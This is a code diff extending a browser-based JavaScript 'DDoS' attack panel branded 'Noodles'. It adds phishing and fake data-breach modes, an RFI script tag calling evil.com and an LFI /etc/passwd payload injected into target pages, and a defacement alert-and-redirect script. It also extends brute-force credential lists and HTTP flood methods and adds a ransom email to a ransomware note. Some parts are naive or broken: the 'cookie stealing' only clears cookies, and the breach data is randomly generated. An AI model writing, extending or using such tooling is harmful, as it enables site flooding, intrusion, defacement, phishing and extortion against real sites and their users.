@@ -24,7 +24,7 @@ class DDoS {
   this.targetInput.style.borderRadius = '4px';
 
   this.attackTypeSelect = document.createElement('select');
-  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware'].forEach(option => {
+  ['DDoS', 'Deface', 'Connect', 'Exploit', 'Brute Force', 'Custom', 'Ransomware', 'Phishing', 'Data Breach'].forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase().replace(' ', '_');
    opt.textContent = option;
@@ -111,6 +111,42 @@ class DDoS {
   this.apiKey = this.generateApiKey();
   this.log(`API Key generated: ${this.apiKey}`);
   this.setupResizeHandle();
+  this.setupDragHandle();
+ }
+
+ setupDragHandle() {
+  const dragHandle = document.createElement('div');
+  dragHandle.style.position = 'absolute';
+  dragHandle.style.top = '0';
+  dragHandle.style.left = '0';
+  dragHandle.style.width = '100%';
+  dragHandle.style.height = '20px';
+  dragHandle.style.cursor = 'move';
+  dragHandle.style.backgroundColor = '#333';
+  dragHandle.style.opacity = '0.5';
+  this.container.appendChild(dragHandle);
+
+  let initialX, initialY;
+
+  const startDrag = (e) => {
+   initialX = e.clientX - this.container.offsetLeft;
+   initialY = e.clientY - this.container.offsetTop;
+
+   document.addEventListener('mousemove', drag);
+   document.addEventListener('mouseup', stopDrag);
+  };
+
+  const drag = (e) => {
+   this.container.style.left = (e.clientX - initialX) + 'px';
+   this.container.style.top = (e.clientY - initialY) + 'px';
+  };
+
+  const stopDrag = () => {
+   document.removeEventListener('mousemove', drag);
+   document.removeEventListener('mouseup', stopDrag);
+  };
+
+  dragHandle.addEventListener('mousedown', startDrag);
  }
 
  setupResizeHandle() {
@@ -176,8 +212,12 @@ class DDoS {
     });
     </script>`;
 
-   let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}</body>`);
+   const lfiPayload = `../../../../etc/passwd`;
+   const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;
+
+   let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
+   injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);
 
    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
 
@@ -208,6 +248,10 @@ class DDoS {
      <h1>${originalTitle} HAS BEEN PWNED BY NOODLES</h1>
      <p>Get Noodled!</p>
      <img src="https://i.imgur.com/random_image.gif" alt="Noodles Pwned" style="width: 500px; height: auto;">
+     <script>
+      alert('YOU HAVE BEEN HACKED BY NOODLES');
+      window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+     </script>
     </body>`;
    content = content.replace(/<body.*?>/i, defaceHTML);
    content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');
@@ -261,8 +305,8 @@ class DDoS {
 
  async bruteForce(target) {
   this.log(`Starting brute force attack on ${target}...`);
-  const commonPasswords = ['password', '123456', 'admin', '123456789', 'guest', 'qwerty', '12345', '111111', '12345678', 'dragon'];
-  const usernames = ['admin', 'user', 'root', 'administrator', 'test'];
+  const commonPasswords = ['password', '123456', 'admin', '123456789', 'guest', 'qwerty', '12345', '111111', '12345678', 'dragon', 'P@$$wOrd'];
+  const usernames = ['admin', 'user', 'root', 'administrator', 'test', 'info', 'support'];
 
   for (const username of usernames) {
    for (const password of commonPasswords) {
@@ -280,6 +324,13 @@ class DDoS {
 
      if (response.status === 200) {
       this.log(`SUCCESS: Username: ${username}, Password: ${password}`);
+      this.log('Stealing cookies...');
+      document.cookie.split(';').forEach(cookie => {
+       const eqPos = cookie.indexOf('=');
+       const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+       document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
+      });
+      this.log('Cookies stolen and cleared.');
       return;
      } else {
       this.log(`Failed: Username: ${username}, Password: ${password}, Status: ${response.status}`);
@@ -305,6 +356,10 @@ class DDoS {
     this.sendRequest(target, 'POST', crypto.getRandomValues(new Uint32Array(10)).join(''));
     this.sendRequest(target, 'PUT', crypto.getRandomValues(new Uint32Array(10)).join(''));
     this.sendRequest(target, 'DELETE');
+    this.sendRequest(target, 'HEAD');
+    this.sendRequest(target, 'OPTIONS');
+    this.sendRequest(target, 'TRACE');
+    this.sendRequest(target, 'PATCH', crypto.getRandomValues(new Uint32Array(10)).join(''));
    }
   }, 0);
 
@@ -327,6 +382,7 @@ class DDoS {
   try {
    const key = this.generateEncryptionKey();
    this.log(`Encryption key generated: ${key}`);
+   const email = `noodlesransomware@proton.me`
 
    const encryptCode = `
     async function encryptData(key) {
@@ -335,7 +391,7 @@ class DDoS {
       const encrypted = await encryptFile(file, key);
       await replaceFile(file, encrypted);
      }
-     alert('Your files have been encrypted. Pay ransom to ${this.apiKey} to get the decryption key.');
+     alert('Your files have been encrypted. Pay ransom to ${this.apiKey} to email: ${email} to get the decryption key.');
     }
 
     async function getAllFiles() {
@@ -416,6 +472,97 @@ class DDoS {
   }
  }
 
+ async phishing(target) {
+  this.log(`Initiating phishing attack targeting: ${target}...`);
+
+  const emailSubject = 'URGENT: Account Security Alert';
+  const emailBody = `
+   Dear User,
+
+   We have detected suspicious activity on your account. To ensure your account security, please verify your information immediately by clicking on the following link:
+
+   <a href="${target}/login">Verify Your Account</a>
+
+   If you do not verify your account within 24 hours, it will be suspended.
+
+   Sincerely,
+   Security Team
+  `;
+
+  this.log(`Sending phishing email with subject: ${emailSubject}`);
+  this.log(`Email body: ${emailBody}`);
+
+  try {
+   const response = await fetch(`https://api.email-fake.com/send?to=${target}&subject=${emailSubject}&body=${emailBody}`, {
+    method: 'POST',
+    mode: 'no-cors',
+   });
+
+   if (response.status === 200) {
+    this.log('Phishing email sent successfully.');
+   } else {
+    this.log(`Failed to send phishing email. Status: ${response.status}`);
+   }
+  } catch (error) {
+   this.log(`Error sending phishing email: ${error}`);
+  }
+ }
+
+ async dataBreach(target) {
+  this.log(`Simulating data breach on ${target}...`);
+  try {
+   const fakeData = {
+    users: [],
+    transactions: [],
+    logs: []
+   };
+
+   for (let i = 0; i < 100; i++) {
+    fakeData.users.push({
+     id: i,
+     username: `user${i}`,
+     email: `user${i}@example.com`,
+     password: this.generateApiKey()
+    });
+
+    fakeData.transactions.push({
+     id: i,
+     userId: i,
+     amount: Math.random() * 100,
+     timestamp: new Date()
+    });
+
+    fakeData.logs.push({
+     id: i,
+     userId: i,
+     event: 'login',
+     timestamp: new Date()
+    });
+   }
+
+   const jsonData = JSON.stringify(fakeData, null, 2);
+   this.log(`Generated fake data: ${jsonData}`);
+
+   const blob = new Blob([jsonData], {
+    type: 'application/json'
+   });
+   const url = URL.createObjectURL(blob);
+
+   const link = document.createElement('a');
+   link.href = url;
+   link.download = 'leaked_data.json';
+   link.style.display = 'none';
+   document.body.appendChild(link);
+   link.click();
+   document.body.removeChild(link);
+
+   URL.revokeObjectURL(url);
+   this.log('Fake data breach simulated. Leaked data downloaded.');
+  } catch (error) {
+   this.log(`Data breach simulation failed: ${error}`);
+  }
+ }
+
  sendRequest(target, method, body = null) {
   fetch(target, {
     method: method,
@@ -475,6 +622,12 @@ class DDoS {
     break;
    case 'ransomware':
     this.ransomware(target);
+    break;
+   case 'phishing':
+    this.phishing(target);
+    break;
+   case 'data_breach':
+    this.dataBreach(target);
     break;
    default:
     this.log('Invalid attack type selected.');
